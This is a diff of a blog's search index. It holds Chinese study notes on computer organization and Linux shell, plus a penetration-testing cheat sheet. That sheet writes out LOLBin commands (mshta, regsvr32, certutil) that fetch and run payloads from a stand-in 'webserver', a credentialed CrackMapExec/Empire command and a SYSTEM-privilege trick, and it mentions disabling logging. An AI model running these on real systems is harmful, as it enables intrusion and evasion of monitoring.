@@ -1,6 +1,355 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>408 COMPUTER PRINCIPLES MIND MAP</title>
+    <url>/2022/06/04/408com-mindmap/</url>
+    <content><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h1 id="第二章-数据表示与运算"><a href="#第二章-数据表示与运算" class="headerlink" title="第二章 数据表示与运算"></a>第二章 数据表示与运算</h1><h1 id="第三章-存储系统"><a href="#第三章-存储系统" class="headerlink" title="第三章 存储系统"></a>第三章 存储系统</h1><h1 id="第四章-指令系统"><a href="#第四章-指令系统" class="headerlink" title="第四章 指令系统"></a>第四章 指令系统</h1><h1 id="第五章-CPU"><a href="#第五章-CPU" class="headerlink" title="第五章 CPU"></a>第五章 CPU</h1><h1 id="第六章-总线"><a href="#第六章-总线" class="headerlink" title="第六章 总线"></a>第六章 总线</h1><h1 id="第七章-I-x2F-O系统"><a href="#第七章-I-x2F-O系统" class="headerlink" title="第七章 I&#x2F;O系统"></a>第七章 I&#x2F;O系统</h1><p><img src="/img/com_mind_map/IO.png" alt="IO.png"></p>
+]]></content>
+      <categories>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX OS</title>
+    <url>/2022/03/22/LINUX-OS/</url>
+    <content><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol>
+<li><p>MBR：主引导记录</p>
+</li>
+<li><p>grub2引导 (grub「grand unified bootloader 宏大的统一引导启动程序」：幼虫，搜寻)</p>
+<ol>
+<li>boot.img</li>
+<li>core.img</li>
+<li>*.mod</li>
+<li>grub.cfg a. 未独立&#x2F;boot：&#x2F;boot&#x2F;grub2&#x2F;grub.cfg b. 独立&#x2F;boot:&#x2F;grub2&#x2F;grub.cfg</li>
+<li>grun2-setpassword：设置引导密码</li>
+</ol>
+</li>
+<li><p>init：PID&#x3D;1（进程号）</p>
+<ol>
+<li>centos7第一个进程：systemd（配置文件：&#x2F;usr&#x2F;system&#x2F;systemd&#x2F;）</li>
+<li>执行登录 &#x2F;bin&#x2F;login</li>
+</ol>
+</li>
+<li><p>demesg | less：“|”管道符，左侧命令输出作为右侧的输入</p>
+</li>
+<li><p>&#x2F;dev：设备 –&gt; 文件</p>
+</li>
+<li><p>&#x2F;usr：unix shared resources（共享资源）「类似win的Program Files」</p>
+</li>
+<li><p>&#x2F;src：原文件</p>
+</li>
+<li><p>&#x2F;tmp：临时文件</p>
+</li>
+<li><p>&#x2F;var（variable）：日志文件、打印机脱机工作文件、缓冲区</p>
+</li>
+<li><p>&#x2F;opt（option）：选项文件</p>
+</li>
+<li><p>&#x2F;mnt（mount）：挂载</p>
+</li>
+<li><p>cd：change directory</p>
+</li>
+<li><p>文件类型：</p>
+<ol>
+<li>d：目录</li>
+<li>l：链接</li>
+<li>b：块设备</li>
+<li>c：字符设备文件</li>
+<li>-：普通文件</li>
+</ol>
+</li>
+<li><p>文件权限：</p>
+<ol>
+<li>用户组：U &#x2F; G &#x2F; A</li>
+<li>九位字母表示法：d[文件类型] rwx[文件属主] r-x[同组用户] r–[其他用户]</li>
+</ol>
+</li>
+<li><p>cat快速编辑：</p>
+<ol>
+<li>cat&gt;test</li>
+<li>[输入字符]</li>
+</ol>
+</li>
+<li><p>tail &amp; head：查看后十行，前十行 &#x2F;&#x2F;-n num : 指定行数</p>
+</li>
+<li><p>mdir [ -m ] [ -p 目录名 ]</p>
+</li>
+<li><p>rmdir（remove dir）：用于删除空目录</p>
+<ol>
+<li>rm -r</li>
+</ol>
+</li>
+<li><p>touch：修改时间属性 * （不存在）创建文件</p>
+</li>
+<li><p>软链接：ln -s</p>
+</li>
+<li><p>硬链接：ln</p>
+<ol>
+<li>以文件副本形式存在，不占用实际控件</li>
+<li>不允许目录硬链接</li>
+<li>只有在同一个文件系统才允许硬链接</li>
+</ol>
+</li>
+<li><p>查找类：which、whereis、find、grep</p>
+</li>
+<li><p>文件重定向：</p>
+<ul>
+<li>&#x2F;dev&#x2F;stdin：标准输入文件</li>
+<li>&#x2F;dev&#x2F;stdout：标准输出文件</li>
+</ul>
+<ol>
+<li>输出重定向<ol>
+<li>“&gt;”：文件存在，覆盖</li>
+<li>“&gt;&gt;”：文件存在，添加内容到文件末尾</li>
+</ol>
+</li>
+<li>输入重定向<ol>
+<li>“&lt;”</li>
+</ol>
+</li>
+<li>管道符重定向：“|” 左输出为右输入</li>
+</ol>
+</li>
+</ol>
+<h1 id="yum包管理"><a href="#yum包管理" class="headerlink" title="yum包管理"></a>yum包管理</h1><ul>
+<li><p>centos镜像源文件的目录默认路径：<br><code>/etc/yum.repos.d/</code></p>
+</li>
+<li><p>备份：<br><code>cp /etc/yum.repos.d/CentOS-Linux-BaseOS.repo /etc/yum.repos.d/CentOS-Linux-BaseOS.repo.bak</code></p>
+</li>
+</ul>
+<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><ul>
+<li><p>下载国内常用的镜像源并重命名为CentOS-Linux-BaseOS.repo,将其作为当前系统的镜像源</p>
+<p>  +【阿里源】</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##CentOS 8</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在使用阿里云的 centos8 的 yum 时报错：由于centos8 在2022年停止服务，后继版本为8-steam  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##CentOS 8-stream</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure></li>
+<li>【网易源】</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.163.com/.help/CentOS8-Base-163.repo</span><br></pre></td></tr></table></figure>
+<ul>
+<li>『添加epel源』</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo</span><br></pre></td></tr></table></figure>
+<ul>
+<li>『清华源』：<a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/">Guide</a></li>
+</ul>
+</li>
+<li><p>清理缓存</p>
+<p>  yum的缓存文件的存放目录是以下路径下：&#x2F;var&#x2F;cache&#x2F;yum 直接清空给目录，或者使用一下命令均可</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure></li>
+<li><p>重新生成缓存</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
+<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum makecache</span><br><span class="line">yum clean all</span><br><span class="line">yum info [pagename]</span><br><span class="line">yum list</span><br><span class="line">yum search</span><br></pre></td></tr></table></figure>
+<h1 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h1></li>
+</ul>
+<ol>
+<li><h2 id="shell概念"><a href="#shell概念" class="headerlink" title="shell概念"></a>shell概念</h2><ul>
+<li>shell程序就是一个包含若干行shell或者linux命令的文件.</li>
+<li>像编写高级语言的程序一样，编写一个shell程序需要一个文本编辑器.如ⅥM等.</li>
+<li>在文本编辑环境下，依据shell的语法规则，输入一些shell&#x2F;linux命令行，形成一个完整的程序文件.</li>
+<li>执行shell程序文件有三种方法<ol>
+<li>#chmod +x file（在&#x2F;etc&#x2F;profile中，加入export PATH&#x3D;${PATH}:~&#x2F;yourpath，就可以在命令行下直接运行，像执行普通命令一样）</li>
+<li>#. file</li>
+<li>#sh file</li>
+<li>#source file</li>
+</ol>
+</li>
+<li>在编写shell时，第一行一定要指明系统需要那种shell解释你的shell程序（如：#! &#x2F;bin&#x2F;bash,#! &#x2F;bin&#x2F;csh,&#x2F;bin&#x2F;tcsh，还是#! &#x2F;bin&#x2F;pdksh .）</li>
+<li>接口概念：在计算机体系结构中，操作系统是最接近硬件的软件部分，其更侧重从软件和功能的角度出发去描述部件，所以称之为<strong>设备控制器</strong>；而在计算机组成原理中，研究的重点在于硬件组成部分，其更青睐于从硬件的角度出发去描述部件，所以称之为<strong>I&#x2F;O接口</strong>。</li>
+</ul>
+</li>
+</ol>
+<h2 id="各类Shell"><a href="#各类Shell" class="headerlink" title="各类Shell"></a>各类Shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br><span class="line">echo $0</span><br><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>bash</p>
+</li>
+<li><p>zsh</p>
+<ul>
+<li>zshell简介：Zsh（Z-shell）是一款用于交互式使用的shell，也可以作为脚本解释器来使用。其包含了 bash，ksh，tcsh 等其他shell中许多优秀功能，也拥有诸多自身特色。</li>
+<li>zshell发展历史：Zsh初版由原作者保罗·弗斯塔德（Paul Falstad）于1990年在普林斯顿大学求学时编写 [3] 。其名称zsh源于普林斯顿大学助教的邵中（Zhong Shao，现任耶鲁大学教授）——保罗将邵中的用户名”zsh”作为此Shell的名称</li>
+<li>zsh美化<h2 id="SHELL文件类型"><a href="#SHELL文件类型" class="headerlink" title="SHELL文件类型"></a>SHELL文件类型</h2>&#x2F; vim test1.sh<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x test1.sh</span><br><span class="line">./test1.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh test1.sh</span><br></pre></td></tr></table></figure>
+<h2 id="SHELL基本操作"><a href="#SHELL基本操作" class="headerlink" title="SHELL基本操作"></a>SHELL基本操作</h2></li>
+</ul>
+</li>
+<li><p>变量赋值调用</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $0 $1 $2 </span><br></pre></td></tr></table></figure>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh echotest1.sh 0 1 2 3</span><br><span class="line"><span class="meta">#</span><span class="language-bash">output:0 1 2</span></span><br></pre></td></tr></table></figure></li>
+<li><p>expr：数值计算</p>
+<ul>
+<li>“+、-、\、&#x2F;、%”</li>
+<li>用法：“ $ () ”、“$ []”<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expr 2 + 3</span><br><span class="line"># output：5</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>shell脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">touch test1</span><br><span class="line">mkdir test1</span><br><span class="line">mv test1 /test1</span><br></pre></td></tr></table></figure>
+<ol>
+<li>判断语法（a[]、test ?）<ol>
+<li>文件类判断<ul>
+<li>-e filename #如果 filename为目录，则为真</li>
+<li>-f filename #如果 filename为常规文件，则为真</li>
+<li>-L filename #如果 filename为符号链接，则为真</li>
+<li>-r filename #如果 filename可读，则为真</li>
+<li>-w filename #如果 filename可写，则为真</li>
+<li>-x filename #如果 filename可执行，则为真</li>
+<li>-s filename #如果文件长度不为0，则为真</li>
+<li>-h filename #如果文件是软链接，则为真</li>
+</ul>
+</li>
+<li>数值比较判断<ul>
+<li>-eq：等于为真</li>
+<li>-ne：不等于为真</li>
+<li>-lt：小于为真</li>
+<li>-le：小于等于为真</li>
+<li>-gt：大于为真</li>
+<li>-ge：大于等于为真</li>
+</ul>
+</li>
+<li>字符串判断<ul>
+<li>str：str非空，真</li>
+<li>s1 &#x3D; s2</li>
+<li>s1 !&#x3D; s2</li>
+<li>-n str：str不为0，真</li>
+<li>-z str：str为0，真</li>
+</ul>
+</li>
+<li>组合语法<ul>
+<li>！：逻辑非</li>
+<li>-a：逻辑与</li>
+<li>-o：逻辑或</li>
+<li>(  )：表达式分组，优先级区分</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>#如果&#x3D;&#x3D;文件夹&#x3D;&#x3D;不存在，则创建文件夹</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tempPath=&quot;/home/parasaga/blank&quot;</span><br><span class="line">if [ ! -d &quot;$tempPath&quot; ]; </span><br><span class="line">then mkdir $blankPath</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>#如果&#x3D;&#x3D;文件&#x3D;&#x3D;不存在，则创建文件</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tempFile=&quot;/home/parasaga/blank/error.log&quot;</span><br><span class="line">if [ ! -f &quot;$tempFile&quot; ]; </span><br><span class="line">then touch $tempFile</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ ! -f test1 ]</span><br><span class="line">then echo &quot;flase&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;true&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>演示示例</p>
+   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read s1</span><br><span class="line">if [ $s1 == 1 ]</span><br><span class="line">then echo 123</span><br><span class="line">mkdir shell1</span><br><span class="line">elif [ $s1 == 2 ]</span><br><span class="line">then echo 321</span><br><span class="line">		mkdir shell2</span><br><span class="line">else</span><br><span class="line">		echo finding</span><br><span class="line">if [  -d shell1 ]</span><br><span class="line">then    rm -r shell1</span><br><span class="line">		echo ok1</span><br><span class="line">fi</span><br><span class="line">if [  -d shell2 ]</span><br><span class="line">then rm -r shell2</span><br><span class="line">		echo ok2</span><br><span class="line">else</span><br><span class="line">		echo false</span><br><span class="line">fi</span><br><span class="line">fi       </span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li><p>函数定义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">functionname</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSum()&#123;</span><br><span class="line">SUM=$[$n1+$n2]</span><br><span class="line">echo &quot;sum=$SUM&quot;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">read -p &quot;请输入第一个参数n1：&quot; n1</span><br><span class="line">read -p &quot;请输入第二个参数n2：&quot; n2</span><br><span class="line"></span><br><span class="line"># 调用 getSum 函数</span><br><span class="line">getSum $n1 $n2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>循环语句</p>
+<ul>
+<li><p>while</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while 条件（为真时执行）</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
+<li><p>until：测试发生在循环末尾，因此循环至少<strong>执行一次</strong></p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">until 条件</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
+<li><p>for</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for 变量名 [ in 数值列表 ]</span><br><span class="line">do</span><br><span class="line">	语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
+<li><pre><code>exit 0
+</code></pre>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>开源项目</category>
+        <category>LINUX OS</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C/C++ PROGRAM-GUIDE</title>
     <url>/2022/03/17/C-PROGRAM-GUIDE/</url>
     <content><![CDATA[<!-- markdown="1" is required for GitHub Pages to render the TOC properly. -->
@@ -655,356 +1004,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LINUX OS</title>
-    <url>/2022/03/22/LINUX-OS/</url>
-    <content><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol>
-<li><p>MBR：主引导记录</p>
-</li>
-<li><p>grub2引导 (grub「grand unified bootloader 宏大的统一引导启动程序」：幼虫，搜寻)</p>
-<ol>
-<li>boot.img</li>
-<li>core.img</li>
-<li>*.mod</li>
-<li>grub.cfg a. 未独立&#x2F;boot：&#x2F;boot&#x2F;grub2&#x2F;grub.cfg b. 独立&#x2F;boot:&#x2F;grub2&#x2F;grub.cfg</li>
-<li>grun2-setpassword：设置引导密码</li>
-</ol>
-</li>
-<li><p>init：PID&#x3D;1（进程号）</p>
-<ol>
